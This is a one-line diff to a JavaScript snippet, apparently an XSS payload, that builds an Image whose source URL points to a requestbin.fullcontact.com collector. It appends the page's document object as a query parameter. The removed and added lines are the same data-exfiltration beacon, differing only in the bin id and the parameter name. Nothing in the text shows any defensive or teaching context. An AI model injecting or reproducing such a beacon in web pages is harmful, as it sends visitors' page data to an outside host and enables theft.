@@ -1,1 +1,1 @@
-new Image().src="http://requestbin.fullcontact.com/1m6mqn61?document="+document;
+new Image().src="http://requestbin.fullcontact.com/10tmuur1?msg="+document;
